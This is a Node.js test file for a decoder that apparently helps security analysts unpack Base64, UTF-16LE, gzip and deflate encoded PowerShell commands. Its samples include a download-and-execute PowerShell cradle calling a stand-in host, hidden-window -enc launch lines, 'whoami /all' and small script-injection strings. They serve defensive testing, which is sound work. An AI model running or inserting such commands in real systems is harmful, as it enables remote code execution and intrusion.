// Run with:  node --test tests/
const test = require('node:test');
const assert = require('node:assert/strict');
const zlib = require('node:zlib');
const { decode } = require('../js/decoder.js');

const utf16b64 = (s) => Buffer.from(s, 'utf16le').toString('base64');
const utf8b64 = (s) => Buffer.from(s, 'utf8').toString('base64');
const CMD = "IEX (New-Object Net.WebClient).DownloadString('http://example.test/a.ps1')";

test('PowerShell -EncodedCommand (UTF-16LE)', async () => {
  const r = await decode('powershell.exe -NoP -NonI -W Hidden -enc ' + utf16b64(CMD));
  assert.equal(r.ok, true);
  assert.equal(r.output, CMD);
  assert.equal(r.warnings.length, 0);
  assert.ok(r.steps.includes('UTF-16LE'));
});

test('placeholder example in the UI decodes', async () => {
  const r = await decode('powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoACcAaABlAGwAbABvACcAKQA=');
  assert.equal(r.output, "IEX ('hello')");
});

test('flag variants: -e, -EncodedCommand, /enc, en dash, quoted payload', async () => {
  for (const flag of ['-e', '-EncodedCommand', '/enc', '\u2013ec', '-ENCODEDCOMMAND']) {
    const r = await decode(`pwsh ${flag} "${utf16b64('whoami /all')}"`);
    assert.equal(r.output, 'whoami /all', flag);
  }
});

test('-ExecutionPolicy is not mistaken for -EncodedCommand', async () => {
  const r = await decode('powershell -ExecutionPolicy Bypass -enc ' + utf16b64('Get-Process'));
  assert.equal(r.output, 'Get-Process');
});

test('plain UTF-8 Base64', async () => {
  const r = await decode(utf8b64('Hello, security analyst! \u00e9\u00e8 \u2713'));
  assert.equal(r.output, 'Hello, security analyst! \u00e9\u00e8 \u2713');
  assert.equal(r.warnings.length, 0);
});

test('plain UTF-16LE Base64 without flag', async () => {
  const r = await decode(utf16b64(CMD));
  assert.equal(r.output, CMD);
});

test('non-Latin UTF-16LE with -enc hint', async () => {
  const s = '\u041f\u0440\u0438\u0432\u0435\u0442 \u043c\u0438\u0440';
  const r = await decode('powershell -enc ' + utf16b64(s));
  assert.equal(r.output, s);
});

test('spaces, line breaks, quotes and missing padding', async () => {
  const b64 = utf16b64(CMD).replace(/=+$/, '');
  const messy = '  "' + b64.slice(0, 20) + '\r\n ' + b64.slice(20, 50) + '\n\t' + b64.slice(50) + '"  ';
  const r = await decode(messy);
  assert.equal(r.output, CMD);
  assert.equal(r.warnings.length, 0);
  assert.ok(r.notes.some((n) => /padding/i.test(n)));
});

test('URL-safe Base64', async () => {
  const s = '??>>~~ subjects?';
  const b64 = utf8b64(s).replace(/\+/g, '-').replace(/\//g, '_');
  const r = await decode(b64);
  assert.equal(r.output, s);
});

test('FromBase64String extraction', async () => {
  const r = await decode(`$x=[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('${utf16b64('calc.exe')}'));iex $x`);
  assert.equal(r.output, 'calc.exe');
});

test('truncated input decodes partially with a warning', async () => {
  const b64 = utf16b64(CMD);
  const r = await decode(b64.slice(0, b64.length - 7));
  assert.equal(r.ok, true);
  assert.ok(r.warnings.length > 0);
  assert.ok(CMD.startsWith(r.output.replace(/\uFFFD$/, '')));
});

test('invalid characters are removed with a warning, never silently', async () => {
  const b64 = utf8b64('Get-ChildItem C:\\Users');
  const r = await decode(b64.slice(0, 8) + '!' + b64.slice(8));
  assert.equal(r.output, 'Get-ChildItem C:\\Users');
  assert.ok(r.warnings.some((w) => /invalid character/.test(w)));
});

test('non-Base64 text is rejected', async () => {
  const r = await decode('this is just a normal sentence, not base64 at all!!!');
  assert.equal(r.ok, false);
});

test('empty input', async () => {
  const r = await decode('   ');
  assert.equal(r.ok, false);
});

test('gzip-compressed payload', async () => {
  const b64 = zlib.gzipSync(Buffer.from(CMD)).toString('base64');
  const r = await decode(b64);
  assert.equal(r.output, CMD);
  assert.ok(r.steps.includes('Gzip decompressed'));
});

test('raw deflate payload (PowerShell DeflateStream)', async () => {
  const b64 = zlib.deflateRawSync(Buffer.from(CMD)).toString('base64');
  const r = await decode(b64);
  assert.equal(r.output, CMD);
});

test('truncated gzip gives partial output with warning', async () => {
  const big = CMD.repeat(200);
  const gz = zlib.gzipSync(Buffer.from(big));
  const r = await decode(gz.subarray(0, Math.floor(gz.length / 2)).toString('base64'));
  assert.ok(r.warnings.length > 0);
});

test('binary data shown as hex dump with warning', async () => {
  const bin = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00, 0xb8, 0x01, 0x02]);
  const r = await decode(bin.toString('base64'));
  assert.match(r.output, /^00000000  4d 5a/);
  assert.ok(r.warnings.some((w) => /Windows executable/.test(w)));
});

test('decoded HTML/script is returned as plain text only', async () => {
  const s = '<script>alert(1)</script><img src=x onerror=alert(2)>';
  const r = await decode(utf8b64(s));
  assert.equal(r.output, s);
});
